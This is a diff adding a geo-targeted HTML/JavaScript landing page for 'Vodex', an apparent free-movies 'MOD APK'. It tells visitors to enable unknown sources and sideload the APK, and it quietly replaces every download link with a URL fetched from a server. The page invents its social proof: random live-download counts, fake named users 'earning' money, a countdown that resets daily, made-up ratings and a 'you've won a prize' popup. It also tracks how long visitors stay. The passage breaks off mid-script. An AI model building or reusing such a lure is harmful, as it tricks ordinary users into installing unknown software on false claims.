@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Vodex - Stream Short Dramas</title>
+<meta name="description" content="Stream thousands of short dramas and movies for free.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',system-ui,-apple-system,sans-serif;background:#000;color:#fff;min-height:100vh;-webkit-font-smoothing:antialiased}
+
+/* Header */
+.header{position:sticky;top:0;z-index:100;background:rgba(0,0,0,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,0.06);padding:12px 16px;display:flex;justify-content:space-between;align-items:center}
+.header-left{display:flex;align-items:center;gap:10px}
+.header-logo{width:36px;height:36px;border-radius:10px;object-fit:cover;display:block}
+.header-brand{font-size:18px;font-weight:800;letter-spacing:-0.5px}
+.header-right{display:flex;align-items:center;gap:12px}
+.live-dot{width:6px;height:6px;background:#22c55e;border-radius:50%;animation:livePulse 2s infinite}
+@keyframes livePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.5)}}
+.online-badge{font-size:11px;color:rgba(255,255,255,0.6);font-weight:500;display:flex;align-items:center;gap:6px}
+.online-num{color:#22c55e;font-weight:700}
+
+/* Hero */
+.hero{position:relative;padding:32px 20px 28px;text-align:center;overflow:hidden}
+.hero::after{content:'';position:absolute;bottom:0;left:0;right:0;height:60px;background:linear-gradient(transparent,#000);z-index:1}
+.hero-content{position:relative;z-index:2}
+.app-icon-wrap{margin-bottom:16px}
+.app-icon{width:80px;height:80px;border-radius:18px;object-fit:cover;box-shadow:0 12px 40px rgba(0,0,0,0.5);border:2px solid rgba(255,255,255,0.1);display:block;margin:0 auto}
+.hero h1{font-size:22px;font-weight:800;letter-spacing:-0.5px;margin-bottom:4px;line-height:1.2}
+.hero .subtitle{font-size:13px;color:rgba(255,255,255,0.65);margin-bottom:14px;font-weight:500}
+.rating-row{display:flex;align-items:center;justify-content:center;gap:16px;margin-bottom:16px;flex-wrap:wrap}
+.rating-stars{display:flex;align-items:center;gap:2px}
+.rating-stars .star{color:#fbbf24;font-size:14px}
+.rating-score{font-size:22px;font-weight:800;letter-spacing:-0.5px}
+.rating-count{font-size:11px;color:rgba(255,255,255,0.5);font-weight:500}
+.rating-divider{width:1px;height:28px;background:rgba(255,255,255,0.12)}
+.stat-item{text-align:center}
+.stat-val{font-size:18px;font-weight:800}
+.stat-label{font-size:10px;color:rgba(255,255,255,0.5);font-weight:500;text-transform:uppercase;letter-spacing:0.5px}
+.tag-row{display:flex;gap:6px;justify-content:center;flex-wrap:wrap;margin-bottom:18px}
+.tag-pill{padding:5px 12px;border-radius:100px;font-size:11px;font-weight:600;border:1px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.06)}
+.tag-pill.accent{border:none}
+
+/* Download Button */
+.dl-btn{display:flex;align-items:center;justify-content:center;gap:10px;color:#fff;text-decoration:none;padding:15px 32px;border-radius:14px;font-size:16px;font-weight:700;letter-spacing:-0.2px;transition:all 0.2s;width:100%;max-width:380px;margin:0 auto;position:relative;overflow:hidden}
+.dl-btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent 40%,rgba(255,255,255,0.1) 50%,transparent 60%);animation:btnShine 3s infinite}
+@keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
+.dl-btn:active{transform:scale(0.97)}
+.dl-btn svg{width:20px;height:20px}
+.dl-meta{margin-top:10px;font-size:11px;color:rgba(255,255,255,0.4);font-weight:500;text-align:center}
+
+/* Section */
+.section{padding:28px 16px}
+.section-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.section-title{font-size:18px;font-weight:800;letter-spacing:-0.3px}
+.section-more{font-size:12px;font-weight:600;opacity:0.5}
+
+/* Genre */
+.genre-scroll{display:flex;gap:8px;overflow-x:auto;padding-bottom:14px;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+.genre-scroll::-webkit-scrollbar{display:none}
+.genre-chip{flex-shrink:0;padding:7px 16px;border-radius:100px;font-size:12px;font-weight:600;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);cursor:pointer;transition:all 0.2s;white-space:nowrap}
+.genre-chip.active{color:#fff;border-color:transparent}
+
+/* Drama Grid */
+.drama-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+@media(min-width:480px){.drama-grid{grid-template-columns:repeat(3,1fr)}}
+@media(min-width:768px){.drama-grid{grid-template-columns:repeat(4,1fr)}}
+.drama-card{position:relative;border-radius:12px;overflow:hidden;background:#111;cursor:pointer;transition:transform 0.15s}
+.drama-card:active{transform:scale(0.97)}
+.drama-card .poster{width:100%;aspect-ratio:3/2;object-fit:cover;display:block;transition:transform 0.3s}
+.drama-card:hover .poster{transform:scale(1.03)}
+.drama-card .card-info{padding:10px 10px 12px}
+.drama-card .card-title{font-size:13px;font-weight:700;line-height:1.3;margin-bottom:3px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.drama-card .card-meta{font-size:10px;color:rgba(255,255,255,0.45);font-weight:500}
+.drama-card .card-badge{position:absolute;top:8px;left:8px;padding:3px 8px;border-radius:6px;font-size:9px;font-weight:800;letter-spacing:0.3px;text-transform:uppercase;color:#fff}
+.drama-card .card-rating{position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.65);backdrop-filter:blur(8px);padding:3px 7px;border-radius:6px;font-size:10px;font-weight:700;color:#fbbf24;display:flex;align-items:center;gap:3px}
+
+/* Promo Banner */
+.promo{margin:8px 16px;border-radius:16px;padding:28px 24px;text-align:center;position:relative;overflow:hidden}
+.promo::before{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M30 0L60 30L30 60L0 30Z' fill='rgba(255,255,255,0.03)'/%3E%3C/svg%3E") repeat}
+.promo h3{font-size:20px;font-weight:800;margin-bottom:6px;position:relative;letter-spacing:-0.3px}
+.promo p{font-size:13px;opacity:0.85;margin-bottom:18px;position:relative;line-height:1.5}
+
+/* Features */
+.features-section{padding:28px 16px}
+.feature-grid{display:grid;gap:10px}
+.feature-card{display:flex;gap:14px;align-items:center;background:rgba(255,255,255,0.04);padding:16px;border-radius:14px;border:1px solid rgba(255,255,255,0.06)}
+.feature-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;background:rgba(255,255,255,0.06)}
+.feature-title{font-size:14px;font-weight:700;margin-bottom:2px;letter-spacing:-0.2px}
+.feature-desc{font-size:12px;color:rgba(255,255,255,0.45);line-height:1.4;font-weight:400}
+
+/* Install Guide */
+.install{padding:28px 16px;background:rgba(255,255,255,0.02)}
+.install-steps{display:grid;gap:12px}
+.step{display:flex;gap:14px;align-items:center}
+.step-num{width:32px;height:32px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;flex-shrink:0;color:#fff}
+.step-text{font-size:13px;color:rgba(255,255,255,0.7);line-height:1.4;font-weight:500}
+
+/* Bottom CTA */
+.bottom-cta{padding:28px 16px;text-align:center}
+
+/* Footer */
+.footer{text-align:center;padding:24px 16px 40px;border-top:1px solid rgba(255,255,255,0.06)}
+.footer p{color:rgba(255,255,255,0.25);font-size:11px;font-weight:500}
+.footer .footer-links{margin-bottom:8px;display:flex;gap:16px;justify-content:center}
+.footer .footer-links a{color:rgba(255,255,255,0.3);font-size:11px;text-decoration:none;font-weight:500}
+
+
+/* Trust */
+.trust-bar{display:flex;justify-content:center;gap:20px;padding:16px;flex-wrap:wrap}
+.trust-item{display:flex;align-items:center;gap:6px;font-size:11px;color:rgba(255,255,255,0.4);font-weight:500}
+.trust-icon{font-size:14px}
+
+/* Urgency Banner */
+.urgency{background:linear-gradient(90deg,#E63946,#8B5CF6);padding:10px 16px;text-align:center;font-size:12px;font-weight:700;letter-spacing:0.3px;animation:urgencyPulse 2s infinite}
+@keyframes urgencyPulse{0%,100%{opacity:1}50%{opacity:0.85}}
+.urgency .countdown{font-family:monospace;font-size:14px;background:rgba(0,0,0,0.3);padding:2px 8px;border-radius:6px;margin-left:6px}
+
+/* Social Proof Toast */
+.toast{position:fixed;bottom:80px;left:16px;right:16px;max-width:340px;background:rgba(20,20,20,0.95);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:12px 16px;display:flex;align-items:center;gap:12px;z-index:90;transform:translateY(120%);transition:transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275);font-size:12px}
+.toast.show{transform:translateY(0)}
+.toast-avatar{width:36px;height:36px;border-radius:50%;object-fit:cover;flex-shrink:0}
+.toast-text{color:rgba(255,255,255,0.8);line-height:1.4}
+.toast-text strong{color:#fbbf24}
+.toast-time{font-size:10px;color:rgba(255,255,255,0.3);margin-top:2px}
+
+/* Floating Download Button */
+.float-dl{position:fixed;bottom:16px;left:16px;right:16px;z-index:95;max-width:400px;margin:0 auto;opacity:0;transform:translateY(20px);transition:all 0.3s}
+.float-dl.show{opacity:1;transform:translateY(0)}
+.float-dl a{display:flex;align-items:center;justify-content:center;gap:8px;padding:14px;border-radius:16px;font-size:15px;font-weight:800;color:#fff;text-decoration:none;box-shadow:0 8px 32px rgba(0,0,0,0.5)}
+
+/* Mobile optimizations */
+@media(max-width:480px){
+  .hero h1{font-size:20px}
+  .rating-row{gap:12px}
+  .stat-val{font-size:16px}
+  .rating-score{font-size:20px}
+  .dl-btn{padding:16px;font-size:17px;border-radius:16px}
+  .drama-card .card-title{font-size:12px}
+  .section-title{font-size:16px}
+  .feature-card{padding:14px}
+  .bottom-cta{padding:24px 16px 100px}
+  .footer{padding-bottom:100px}
+}
+
+/* Limited time banner */
+.ltd-banner{background:linear-gradient(90deg,#f59e0b,#ef4444,#f59e0b);background-size:200% 100%;animation:ltdSlide 3s linear infinite;padding:8px 16px;text-align:center;font-size:12px;font-weight:700;color:#000;letter-spacing:0.5px}
+@keyframes ltdSlide{0%{background-position:0% 50%}100%{background-position:200% 50%}}
+.ltd-banner span{background:rgba(0,0,0,0.15);padding:2px 8px;border-radius:4px;margin-left:4px;font-family:monospace}
+</style>
+</head>
+<body>
+<div id="root"></div>
+
+<script>
+var LOCALES = {
+  MX: {
+    lang:"es-MX", flag:"\ud83c\uddf2\ud83c\uddfd",
+    accent:"#E63946", accent2:"#1D6A3B",
+    heroGrad:"linear-gradient(165deg,#1D6A3B 0%,#145230 40%,#0a0a0a 100%)",
+    logoBg:"linear-gradient(135deg,#E63946,#1D6A3B)",
+    btnBg:"linear-gradient(135deg,#E63946 0%,#c62828 100%)",
+    btnShadow:"0 8px 32px rgba(230,57,70,0.4)",
+    badgeBg:"#E63946",
+    chipActive:"background:#E63946",
+    stepBg:"linear-gradient(135deg,#1D6A3B,#E63946)",
+    popupBg:"linear-gradient(160deg,#1D6A3B 0%,#0d3d22 60%,#E63946 100%)",
+    popupBtn:"linear-gradient(135deg,#E63946,#c62828)",
+    promoBg:"linear-gradient(135deg,#1D6A3B 0%,#E63946 100%)",
+    brand:"Vodex",
+    title:"Vodex",
+    heroTitle:"Pel\u00edculas y Series Gratis",
+    heroSub:"Pel\u00edculas y series gratis para siempre \u2022 Sin pagar",
+    dlBtn:"\u2b07 Descargar Gratis",
+    online:"descargando ahora",
+    region:"#1 en M\u00e9xico",
+    sectionTitle:"Populares en M\u00e9xico",
+    sectionMore:"Ver todo",
+    genres:["\ud83d\udd25 Todas","\ud83d\udc95 Romance","\ud83d\ude08 Venganza","\ud83d\udcb0 Millonarios","\ud83c\udfad Misterio","\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67 Familia"],
+    promoTitle:"\ud83c\udfa6 Miles de pel\u00edculas gratis",
+    promoDesc:"Mira <strong>todos los estrenos y grandes pel\u00edculas</strong> sin pagar nada. Gratis para siempre.",
+    promoBtn:"\u2b07 Empezar Ahora",
+    whyTitle:"\u00bfPor qu\u00e9 Vodex?",
+    features:[
+      {i:"\ud83c\udfac",t:"10,000+ Pel\u00edculas",d:"Estrenos, cl\u00e1sicos, series y m\u00e1s. Todo gratis."},
+      {i:"\ud83c\udd95",t:"Estrenos cada d\u00eda",d:"Las \u00faltimas pel\u00edculas agregadas diariamente."},
+      {i:"\ud83d\udcf1",t:"Modo sin conexi\u00f3n",d:"Descarga y mira sin internet."},
+      {i:"\u267e\ufe0f",t:"Gratis para siempre",d:"Sin suscripci\u00f3n, sin pagos, sin anuncios."},
+      {i:"\ud83c\udf1f",t:"Calidad 4K HD",d:"Imagen y sonido de cine en tu celular."}
+    ],
+    installTitle:"C\u00f3mo instalar",
+    steps:["Toca el bot\u00f3n de descarga","Configuraci\u00f3n \u2192 Permitir fuentes desconocidas","Abre el APK e instala","\u00a1Disfruta gratis!"],
+    finalBtn:"Descargar Vodex v8.24.1",
+    popupEmoji:"\ud83c\udfc6",
+    popupTitle:"\u00a1Felicidades!",
+    popupDesc:"Has ganado un <strong>bono de bienvenida</strong>. Descarga ahora para reclamarlo.",
+    popupCta:"\u00a1Reclamar premio!",
+    cur:"MXN",sym:"$",aMin:300,aMax:5000,
+    ltdText:"\u26a1 GRATIS PARA SIEMPRE \u2014 Todas las pel\u00edculas y series sin pagar ",
+    trust:["\ud83d\udd12 Seguro","\u2b50 4.7/5","\ud83d\udcf2 11 MB","\ud83d\udc65 2.5M+"],
+    dramas:[
+      {img:"images/mx_hot_01.webp",t:"Baila Conmigo",tag:"\ud83d\udd25 ESTRENO",r:"9.8",m:"\ud83d\udc83 Romance \u2022 80 Eps"},
+      {img:"images/mx_hot_02.webp",t:"M\u00e1scaras del Deseo",tag:"NEW",r:"9.6",m:"\ud83c\udfad Misterio \u2022 65 Eps"},
+      {img:"images/mx_hot_03.webp",t:"Apuesta por el Amor",tag:"PREMIUM",r:"9.7",m:"\ud83c\udfb0 Suspenso \u2022 72 Eps"},
+      {img:"images/mx_hot_04.webp",t:"Verano Salvaje",tag:"HOT \ud83d\udd25",r:"9.5",m:"\u2600\ufe0f Romance \u2022 58 Eps"},
+      {img:"images/mx_drama_01.webp",t:"Amor Prohibido",tag:"TOP 10",r:"9.6",m:"\ud83d\udc95 Romance \u2022 90 Eps"},
+      {img:"images/mx_drama_05.webp",t:"El Secreto del Enmascarado",tag:"EXCLUSIVO",r:"9.7",m:"\ud83c\udfad Misterio \u2022 55 Eps"},
+      {img:"images/mx_drama_03.webp",t:"El Millonario y La Cenicienta",tag:"M\u00c1S VISTO",r:"9.5",m:"\ud83d\udcb0 Drama \u2022 68 Eps"},
+      {img:"images/mx_drama_07.webp",t:"Entre Dos Mundos",tag:"DRAMA",r:"9.4",m:"\ud83d\udc94 Melodrama \u2022 75 Eps"}
+    ]
+  },
+  ZA: {
+    lang:"en-ZA", flag:"\ud83c\uddff\ud83c\udde6",
+    accent:"#E63946", accent2:"#007749",
+    heroGrad:"linear-gradient(165deg,#002395 0%,#001a6e 40%,#0a0a0a 100%)",
+    logoBg:"linear-gradient(135deg,#007749,#FFB81C)",
+    btnBg:"linear-gradient(135deg,#E63946 0%,#b71c1c 100%)",
+    btnShadow:"0 8px 32px rgba(230,57,70,0.4)",
+    badgeBg:"#E63946",
+    chipActive:"background:#E63946",
+    stepBg:"linear-gradient(135deg,#007749,#E63946)",
+    popupBg:"linear-gradient(160deg,#002395 0%,#001550 60%,#007749 100%)",
+    popupBtn:"linear-gradient(135deg,#E63946,#b71c1c)",
+    promoBg:"linear-gradient(135deg,#007749 0%,#002395 100%)",
+    brand:"Vodex",
+    title:"Vodex",
+    heroTitle:"Free Movies & Series Forever",
+    heroSub:"Free forever \u2022 All movies & series, no payment",
+    dlBtn:"\u2b07 Download Free",
+    online:"downloading now",
+    region:"#1 in South Africa",
+    sectionTitle:"Trending in South Africa",
+    sectionMore:"See all",
+    genres:["\ud83d\udd25 All","\ud83d\udc95 Romance","\ud83d\ude08 Revenge","\ud83d\udcb0 Drama","\ud83c\udfad Thriller","\ud83d\udc51 Family"],
+    promoTitle:"\ud83c\udfa6 Thousands of free movies",
+    promoDesc:"Watch <strong>all new releases and blockbusters</strong> without paying. Free forever.",
+    promoBtn:"\u2b07 Start Now",
+    whyTitle:"Why Vodex?",
+    features:[
+      {i:"\ud83c\udfac",t:"10,000+ Movies",d:"Blockbusters, classics, series & more. All free."},
+      {i:"\ud83c\udd95",t:"Daily New Releases",d:"Latest movies added every day."},
+      {i:"\ud83d\udcf1",t:"Offline Mode",d:"Download and watch without data."},
+      {i:"\u267e\ufe0f",t:"Free Forever",d:"No subscription, no payments, no ads."},
+      {i:"\ud83c\udf1f",t:"4K HD Quality",d:"Cinema quality picture and sound on your phone."}
+    ],
+    installTitle:"How to Install",
+    steps:["Tap the download button","Settings \u2192 Allow unknown sources","Open the APK and install","Enjoy free dramas!"],
+    finalBtn:"Download Vodex v8.24.1",
+    popupEmoji:"\ud83c\udfc6",
+    popupTitle:"Congratulations!",
+    popupDesc:"You've won a <strong>welcome bonus</strong>. Download now to claim it.",
+    popupCta:"Claim Reward!",
+    cur:"ZAR",sym:"R",aMin:100,aMax:2000,
+    ltdText:"\u26a1 FREE FOREVER \u2014 All movies & series, no payment ",
+    trust:["\ud83d\udd12 Secure","\u2b50 4.7/5","\ud83d\udcf2 11 MB","\ud83d\udc65 2.5M+"],
+    dramas:[
+      {img:"images/za_hot_01.webp",t:"Nights in Sandton",tag:"\ud83d\udd25 VIP",r:"9.8",m:"\ud83c\udf1f Glamour \u2022 80 Eps"},
+      {img:"images/za_hot_02.webp",t:"Forever & A Day",tag:"ROMANCE",r:"9.6",m:"\ud83d\udc95 Romance \u2022 65 Eps"},
+      {img:"images/za_hot_03.webp",t:"Power Play",tag:"TRENDING",r:"9.7",m:"\ud83d\udcbc Drama \u2022 72 Eps"},
+      {img:"images/za_hot_04.webp",t:"His Private World",tag:"EXCLUSIVE",r:"9.5",m:"\ud83d\udc51 Romance \u2022 58 Eps"},
+      {img:"images/za_drama_01.webp",t:"Secrets of Sandton",tag:"TOP 10",r:"9.6",m:"\ud83d\udcb0 Drama \u2022 90 Eps"},
+      {img:"images/za_drama_05.webp",t:"Umshado",tag:"HOT \ud83d\udd25",r:"9.7",m:"\ud83c\udfad Mystery \u2022 55 Eps"},
+      {img:"images/za_drama_07.webp",t:"Queens of Joburg",tag:"SEASON 2",r:"9.5",m:"\ud83d\udc51 Drama \u2022 68 Eps"},
+      {img:"images/za_drama_03.webp",t:"Two Worlds Apart",tag:"DRAMA",r:"9.4",m:"\ud83d\udc94 Drama \u2022 75 Eps"}
+    ]
+  }
+};
+
+var DFL = "MX";
+
+function render(L) {
+  document.documentElement.lang = L.lang;
+  document.title = L.title + " - " + L.heroTitle;
+
+  var amt = Math.floor(Math.random()*(L.aMax-L.aMin+1))+L.aMin;
+  var amtStr = L.sym + amt.toLocaleString() + " " + L.cur;
+  var onlineBase = 10000+Math.floor(Math.random()*5000);
+
+  var cards = L.dramas.map(function(d){
+    return '<div class="drama-card" data-dl="1">'+
+      '<img class="poster" src="'+d.img+'" alt="'+d.t+'" loading="lazy" decoding="async">'+
+      '<span class="card-badge" style="background:'+L.badgeBg+'">'+d.tag+'</span>'+
+      '<span class="card-rating">\u2605 '+d.r+'</span>'+
+      '<div class="card-info"><div class="card-title">'+d.t+'</div><div class="card-meta">'+d.m+'</div></div></div>';
+  }).join('');
+
+  var genres = L.genres.map(function(g,i){
+    return '<span class="genre-chip'+(i===0?' active':'')+'" style="'+(i===0?L.chipActive:'')+'"">'+g+'</span>';
+  }).join('');
+
+  var feats = L.features.map(function(f){
+    return '<div class="feature-card"><div class="feature-icon">'+f.i+'</div><div><div class="feature-title">'+f.t+'</div><div class="feature-desc">'+f.d+'</div></div></div>';
+  }).join('');
+
+  var steps = L.steps.map(function(s,i){
+    return '<div class="step"><div class="step-num" style="background:'+L.stepBg+'">'+(i+1)+'</div><div class="step-text">'+s+'</div></div>';
+  }).join('');
+
+  var trustHtml = L.trust.map(function(t){
+    return '<div class="trust-item">'+t+'</div>';
+  }).join('');
+
+  document.getElementById('root').innerHTML =
+    /* Header */
+    '<div class="header">'+
+      '<div class="header-left">'+
+        '<img class="header-logo" src="images/logo.webp?v=2" alt="Vodex">'+
+        '<div class="header-brand">'+L.brand+'</div>'+
+      '</div>'+
+      '<div class="header-right">'+
+        '<div class="online-badge"><span class="live-dot"></span><span class="online-num" id="onlineNum">'+onlineBase.toLocaleString()+'</span> '+L.online+'</div>'+
+      '</div>'+
+      '</div>'+
+
+    /* Limited time banner */
+    '<div class="ltd-banner" id="ltdBanner">'+L.ltdText+'<span id="ltdTimer">23:59:59</span></div>'+
+
+    /* Hero */
+    '<div class="hero" style="background:'+L.heroGrad+'">'+
+      '<div class="hero-content">'+
+        '<div class="app-icon-wrap"><img class="app-icon" src="images/logo.webp?v=2" alt="Vodex"></div>'+
+        '<h1>'+L.heroTitle+'</h1>'+
+        '<div class="subtitle">'+L.heroSub+'</div>'+
+        '<div class="rating-row">'+
+          '<div class="stat-item"><div class="rating-score">4.7</div><div class="rating-stars"><span class="star">\u2605</span><span class="star">\u2605</span><span class="star">\u2605</span><span class="star">\u2605</span><span class="star">\u2605</span></div></div>'+
+          '<div class="rating-divider"></div>'+
+          '<div class="stat-item"><div class="stat-val">2.5M+</div><div class="stat-label">Downloads</div></div>'+
+          '<div class="rating-divider"></div>'+
+          '<div class="stat-item"><div class="stat-val">18+</div><div class="stat-label">Rated</div></div>'+
+        '</div>'+
+        '<div class="tag-row">'+
+          '<span class="tag-pill accent" style="background:'+L.badgeBg+'">'+L.flag+' '+L.region+'</span>'+
+          '<span class="tag-pill">v8.24.1</span>'+
+          '<span class="tag-pill">MOD APK</span>'+
+        '</div>'+
+        '<a class="dl-btn dl-link" href="/api/apk/download" style="background:'+L.btnBg+';box-shadow:'+L.btnShadow+'">'+
+          '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12l7 7 7-7"/></svg>'+
+          L.dlBtn+
+        '</a>'+
+        '<div class="dl-meta">v8.24.1 \u2022 11 MB \u2022 Updated Jun 2026</div>'+
+      '</div>'+
+    '</div>'+
+
+    '<div class="trust-bar">'+trustHtml+'</div>'+
+
+    /* Dramas */
+    '<div class="section">'+
+      '<div class="section-header"><div class="section-title">'+L.sectionTitle+'</div><div class="section-more">'+L.sectionMore+' \u203a</div></div>'+
+      '<div class="genre-scroll">'+genres+'</div>'+
+      '<div class="drama-grid">'+cards+'</div>'+
+    '</div>'+
+
+    /* Promo */
+    '<div class="promo" style="background:'+L.promoBg+'">'+
+      '<h3>'+L.promoTitle+'</h3>'+
+      '<p>'+L.promoDesc+'</p>'+
+      '<a class="dl-btn dl-link" href="/api/apk/download" style="background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);max-width:280px;font-size:14px;padding:13px 24px">'+L.promoBtn+'</a>'+
+    '</div>'+
+
+    /* Features */
+    '<div class="features-section">'+
+      '<div class="section-header"><div class="section-title">'+L.whyTitle+'</div></div>'+
+      '<div class="feature-grid">'+feats+'</div>'+
+    '</div>'+
+
+    /* Install */
+    '<div class="install">'+
+      '<div class="section-header"><div class="section-title">'+L.installTitle+'</div></div>'+
+      '<div class="install-steps">'+steps+'</div>'+
+    '</div>'+
+
+    /* Bottom CTA */
+    '<div class="bottom-cta">'+
+      '<a class="dl-btn dl-link" href="/api/apk/download" style="background:'+L.btnBg+';box-shadow:'+L.btnShadow+'">'+
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12l7 7 7-7"/></svg>'+
+        L.finalBtn+
+      '</a>'+
+      '<div class="dl-meta">v8.24.1 \u2022 11 MB \u2022 Updated Jun 2026</div>'+
+    '</div>'+
+
+    /* Footer */
+    '<div class="footer">'+
+      '<div class="footer-links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Contact</a></div>'+
+      '<p>\u00a9 2024\u20132026 Vodex. All rights reserved.</p>'+
+    '</div>'+
+
+    /* Social proof toast */
+    '<div class="toast" id="toast">'+
+      '<img class="toast-avatar" src="" id="toastAvatar" alt="">'+
+      '<div><div class="toast-text" id="toastText"></div><div class="toast-time" id="toastTime"></div></div>'+
+    '</div>'+
+
+    /* Floating download button */
+    '<div class="float-dl" id="floatDl">'+
+      '<a class="dl-link" href="/api/apk/download" style="background:'+L.btnBg+'">'+
+        '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12l7 7 7-7"/></svg>'+
+        L.dlBtn+
+      '</a>'+
+    '</div>';
+
+  /* Online counter */
+  setInterval(function(){
+    onlineBase += Math.floor(Math.random()*11)-4;
+    if(onlineBase<9000) onlineBase=9500;
+    var el=document.getElementById('onlineNum');
+    if(el) el.textContent=onlineBase.toLocaleString();
+  },3500);
+
+  /* Card clicks */
+  document.querySelectorAll('.drama-card[data-dl]').forEach(function(c){
+    c.onclick=function(){var a=document.querySelector('.dl-link');if(a)window.location.href=a.href;};
+  });
+
+  /* Countdown timer */
+  var ltdSec=86399;
+  setInterval(function(){
+    ltdSec--;if(ltdSec<0)ltdSec=86399;
+    var h=Math.floor(ltdSec/3600),m=Math.floor((ltdSec%3600)/60),s=ltdSec%60;
+    var el=document.getElementById('ltdTimer');
+    if(el)el.textContent=(h<10?'0':'')+h+':'+(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+  },1000);
+
+  /* Floating download - show after scroll */
+  var floatEl=document.getElementById('floatDl');
+  window.addEventListener('scroll',function(){
+    if(window.scrollY>400){floatEl.classList.add('show');}
+    else{floatEl.classList.remove('show');}
+  });
+
+  /* Social proof toasts */
+  var toastNames = L.lang.indexOf('es')===0 ?
+    [{n:"Carlos M.",c:"Ciudad de M\u00e9xico"},{n:"Mar\u00eda L.",c:"Guadalajara"},{n:"Ana R.",c:"Monterrey"},{n:"Diego S.",c:"Puebla"},{n:"Laura G.",c:"Canc\u00fan"},{n:"Roberto F.",c:"Tijuana"},{n:"Sof\u00eda P.",c:"M\u00e9rida"},{n:"Juan V.",c:"Le\u00f3n"}] :
+    [{n:"Thandi M.",c:"Johannesburg"},{n:"Sipho K.",c:"Cape Town"},{n:"Nomsa D.",c:"Durban"},{n:"Bongani S.",c:"Pretoria"},{n:"Zanele N.",c:"Soweto"},{n:"Lerato P.",c:"Sandton"},{n:"Ayanda G.",c:"Bloemfontein"},{n:"Mandla T.",c:"Port Elizabeth"}];
+  var toastMsgs = L.lang.indexOf('es')===0 ?
+    ["acaba de descargar Vodex","est\u00e1 viendo <strong>Amor Prohibido</strong>","gan\u00f3 <strong>$320 MXN</strong> hoy","lleva 2 horas viendo series","se registr\u00f3 hace 3 min","ya lleva 15 episodios hoy"] :
+    ["just downloaded Vodex","is watching <strong>Secrets of Sandton</strong>","earned <strong>R250</strong> today","has been watching for 2 hours","signed up 3 min ago","already watched 15 episodes"];
+  var toastTimes = L.lang.indexOf('es')===0 ?
+    ["hace 1 min","hace 2 min","hace 30 seg","ahora mismo","hace 5 min"] :
+    ["1 min ago","2 min ago","30 sec ago","just now","5 min ago"];
+
+  var toastIdx=0;
+  function showToast(){
+    var t=document.getElementById('toast');
+    var person=toastNames[Math.floor(Math.random()*toastNames.length)];
+    var msg=toastMsgs[Math.floor(Math.random()*toastMsgs.length)];
+    var tm=toastTimes[Math.floor(Math.random()*toastTimes.length)];
+    document.getElementById('toastAvatar').src=L.dramas[Math.floor(Math.random()*L.dramas.length)].img;
+    document.getElementById('toastText').innerHTML='<strong>'+person.n+'</strong> ('+person.c+') '+msg;
+    document.getElementById('toastTime').textContent=tm;
+    t.classList.add('show');
+    setTimeout(function(){t.classList.remove('show');},4000);
+  }
+  setTimeout(function(){showToast();setInterval(showToast,8000);},5000);
+}
+
+/* Init */
+(function(){
+  function go(cc){render(LOCALES[cc]||LOCALES[DFL]);}
+  fetch('/api/geo').then(function(r){return r.json()}).then(function(d){
+    go(d.country_code&&LOCALES[d.country_code]?d.country_code:DFL);
+  }).catch(function(){go(DFL);});
+
+  fetch('/api/apk-url').then(function(r){return r.json()}).then(function(d){
+    if(d.url){setTimeout(function(){
+      document.querySelectorAll('.dl-link').forEach(function(a){a.href=d.url;});
+      document.querySelectorAll('.drama-card[data-dl]').forEach(function(c){c.onclick=function(){window.location.href=d.url;};});
+    },600);}
+  }).catch(function(){});
+})();
+</script>
+
+<!-- Visit Tracking -->
+<script>
+(function(){
+  function genSid(){
+    if(window.crypto&&crypto.randomUUID)return crypto.randomUUID().replace(/-/g,'');
+    return Math.random().toString(36).slice(2)+Date.now().toString(36)+Math.random().toString(36).slice(2);
+  }
+  var sid=genSid(),dwell=0,visible=!document.hidden,lastTick=Date.now();
+  function tick(){var now=Date.now();if(visible)dwell+=now-lastTick;lastTick=now;}
+  document.addEventListener('visibilitychange',function(){tick();visible=!document.hidden;lastTick=Date.now();});
+  function postJSON(url,body){try{return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body),keepalive:true}).catch(function(){});}catch(e){}}
+  postJSON('/api/track/start',{sid:sid,lang:navigator.language||'',url:location.href});
+  setInterval(function(){tick();postJSON('/api/track/heartbeat',{sid:sid,dwell:dwell});},15000);
